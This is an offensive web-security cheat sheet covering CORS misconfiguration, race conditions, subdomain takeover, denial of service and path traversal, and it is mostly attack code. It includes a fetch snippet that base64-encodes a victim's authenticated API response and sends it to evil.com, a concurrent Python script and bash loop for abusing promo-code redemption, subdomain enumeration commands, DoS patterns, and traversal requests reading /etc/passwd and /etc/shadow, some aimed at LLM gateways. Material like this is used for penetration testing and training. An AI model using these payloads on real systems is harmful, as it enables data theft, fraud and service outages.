# Miscellaneous: CORS · Race Conditions · Subdomain Takeover · DoS

---

## CORS Misconfiguration

```
# Vulnerable: Origin reflected without validation
Request:  Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com
          Access-Control-Allow-Credentials: true

# Attack: read authenticated API response from evil.com
fetch('https://TARGET.com/api/private', {credentials:'include'})
  .then(r => r.text()).then(d => fetch('https://evil.com/?d='+btoa(d)));
```

### Common Misconfigs

```
# 1. Regex bypass — checks prefix but not full domain
Allowed: *.legit.com
Bypass:  evil.com.legit.com   ← if regex is /legit\.com$/
         eviltlegit.com       ← if check is just "contains legit.com"

# 2. null origin allowed
Access-Control-Allow-Origin: null
# Exploitable via sandboxed iframe:
<iframe sandbox="allow-scripts" src="data:text/html,<script>...fetch()...</script>">

# 3. All subdomains trusted + XSS on any subdomain
→ chain: XSS on sub.legit.com → CORS read on api.legit.com
```

---

## Race Conditions

```
# Classic: buy item at discount via race condition
# Send 50 concurrent requests to apply promo code:
for i in $(seq 50); do curl -X POST https://TARGET.com/apply-promo &; done

# Account balance: transfer race
# Two simultaneous transfers both succeed before balance check

# 2FA: submit same code twice simultaneously
# Rate limiting: exceed per-second limit via burst

# Tools:
# Burp Suite: Turbo Intruder (send_group_sync)
# Python: asyncio / aiohttp parallel requests
```

```python
import asyncio, aiohttp

async def race(session, url, data):
    async with session.post(url, json=data) as r:
        return await r.text()

async def main():
    async with aiohttp.ClientSession(cookies={'session': 'TOKEN'}) as s:
        tasks = [race(s, 'https://TARGET.com/redeem', {'code':'PROMO'}) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        print(results)

asyncio.run(main())
```

---

## Subdomain Takeover

```
# Scenario: DNS points to external service, service account deleted
CNAME: test.legit.com → legit.github.io  (GitHub Pages account deleted)
→ Register legit.github.io → serve content on test.legit.com → XSS on legit.com origin

# High-value services (CNAME to these = potential takeover):
GitHub Pages     → username.github.io
Heroku           → xxx.herokuapp.com
AWS S3           → bucket.s3.amazonaws.com (if bucket deleted)
Fastly           → CNAME to Fastly origin
Azure            → xxx.azurewebsites.net
Shopify          → xxx.myshopify.com

# Detection:
# 1. Enumerate subdomains (subfinder, amass, assetfinder)
subfinder -d target.com -o subs.txt

# 2. Check each CNAME for dangling pointer
cat subs.txt | httpx -cname | grep -E "github|heroku|amazonaws|azure"

# 3. If CNAME points to unclaimed resource → takeover

# Tools: subjack, can-i-take-over-xyz
```

---

## Denial of Service

### Application-Level DoS (Google Gruyere patterns)

```
# 1. Unprotected admin/shutdown endpoint
GET /quitserver     ← if no auth required, kills server
GET /admin/reset

# 2. Case sensitivity bypass on protected URLs
Protected: /quit
Bypass:    /QUIT or /Quit (if check is case-sensitive)

# 3. Resource exhaustion via recursive templates
Upload template that includes itself → infinite recursion → OOM

# 4. ReDoS (Regex Denial of Service)
# Vulnerable regex: (a+)+ on input: "aaaaaaaaaaaaaaaaaaaaaaaaaX"
# Causes exponential backtracking

# 5. Hash collision (HashDoS)
# Send many POST params with same hash → O(n²) hash table operations
```

---

## Path Traversal Quick Reference

→ See `path-traversal.md` for full guide.

Common AI/ML targets:
```bash
# Config file traversal in LLM gateway:
GET /config?model=../../../../etc/passwd

# Upload filename traversal:
filename: ../../../../app/config.py

# Static file serving without canonicalization:
GET /static/../../../etc/shadow
```
